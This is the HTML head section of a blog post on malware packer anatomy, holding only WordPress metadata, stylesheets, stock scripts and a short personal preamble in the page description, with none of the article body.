<!doctype html>
<html lang=en class="no-js">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Anatomy of a simple and popular packer &#8211; Fumik0_&#039;s box</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//fonts-api.wp.com' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//0.gravatar.com' />
<link rel='dns-prefetch' href='//1.gravatar.com' />
<link rel='dns-prefetch' href='//2.gravatar.com' />
<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
<link rel='dns-prefetch' href='//public-api.wordpress.com' />
<link rel='preconnect' href='//i0.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Feed" href="https://fumik0.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Comments Feed" href="https://fumik0.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Anatomy of a simple and popular packer Comments Feed" href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/fumik0.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='bootstrap-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/bootstrap.min.css?ver=4.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/fontawesome-all.min.css?ver=5.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-font-roboto-css' href='https://fonts-api.wp.com/css?family=Roboto%3A300%2C400&#038;ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-css' href='https://fumik0.com/wp-content/themes/mynote/style.css?ver=1.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_likes-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/likes/style.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='subscription-modal-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='https://fumik0.com/wp-content/plugins/tablepress/css/build/default.css?ver=2.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='hcb-style-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/hcb_style.css?ver=1.2.9' type='text/css' media='all' />
<style id='hcb-style-inline-css' type='text/css'>
.hcb_wrap pre.prism{font-size: 15px}@media screen and (max-width: 599px){.hcb_wrap pre.prism{font-size: 15px}}.hcb_wrap pre:not([data-file]):not([data-show-lang])::before{ content: none;}.hcb_wrap pre{-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;}.hcb_wrap pre{font-family:Menlo, Consolas, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;}
</style>
<link rel='stylesheet' id='hcb-coloring-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/coloring_dark.css?ver=1.2.9' type='text/css' media='all' />
<style id='jetpack-global-styles-frontend-style-inline-css' type='text/css'>
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link rel='stylesheet' id='sharedaddy-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/sharedaddy/sharing.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/themes/mynote/assets/js/bootstrap.bundle.min.js?ver=4.1.0" id="bootstrap-js"></script>
<script type="text/javascript" id="jetpack-mu-wpcom-settings-js-before">
/* <![CDATA[ */
var JETPACK_MU_WPCOM_SETTINGS = {"assetsUrl":"https:\/\/fumik0.com\/wp-content\/mu-plugins\/wpcomsh\/vendor\/automattic\/jetpack-mu-wpcom\/src\/build\/"};
/* ]]> */
</script>
<link rel="https://api.w.org/" href="https://fumik0.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://fumik0.com/wp-json/wp/v2/posts/3128" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://fumik0.com/xmlrpc.php?rsd" />

<link rel="canonical" href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/" />
<link rel='shortlink' href='https://wp.me/p9vZjq-Os' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2021%2F04%2F24%2Fanatomy-of-a-simple-and-popular-packer%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2021%2F04%2F24%2Fanatomy-of-a-simple-and-popular-packer%2F&#038;format=xml" />
	<style>img#wpstats{display:none}</style>
		<style id="mynote-customizer">
@media (max-width: 768px) {
.footer-columns { text-align: center !important; }
.footer-columns .footer-column-left { text-align: center !important; }
}
.scroll-area { display: block !important; }
body.menu-is-collapsed .header { background: rgba(20, 25, 29, 1) !important; }

</style><meta name="description" content="It&#039;s been a while that I haven&#039;t release some stuff here and indeed, it&#039;s mostly caused by how fucked up 2020 was. I would have been pleased if this global pandemic hasn&#039;t wrecked me so much but i was served as well. Nowadays, with everything closed, corona haircut is new trend and finding a graphic&hellip;" />
<link rel="amphtml" href="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Anatomy of a simple and popular packer" />
<meta property="og:url" content="https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/" />
<meta property="og:description" content="It&#8217;s been a while that I haven&#8217;t release some stuff here and indeed, it&#8217;s mostly caused by how fucked up 2020 was. I would have been pleased if this global pandemic hasn&#8217;t w…" />
<meta property="article:published_time" content="2021-04-24T20:25:53+00:00" />
<meta property="article:modified_time" content="2021-04-24T20:47:00+00:00" />
<meta property="og:site_name" content="Fumik0_&#039;s box" />
<meta property="og:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/04/Font-1.png?resize=1200%2C429&#038;ssl=1" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="429" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
